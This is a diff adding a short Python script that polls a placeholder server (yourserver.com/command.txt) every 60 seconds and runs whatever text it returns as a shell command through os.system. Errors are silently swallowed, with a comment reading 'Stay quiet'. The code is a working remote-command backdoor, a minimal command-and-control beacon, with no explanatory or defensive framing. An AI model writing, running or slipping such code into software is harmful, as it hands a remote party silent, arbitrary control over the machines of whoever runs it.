@@ -1,0 +1,17 @@
+import time
+import requests
+import os
+
+def check_signal():
+    try:
+        r = requests.get("https://yourserver.com/command.txt")  # Replace with your future signal source
+        if r.status_code == 200:
+            cmd = r.text.strip()
+            if cmd:
+                os.system(cmd)
+    except Exception as e:
+        pass  # Stay quiet
+
+while True:
+    check_signal()
+    time.sleep(60)  # check every 60 seconds
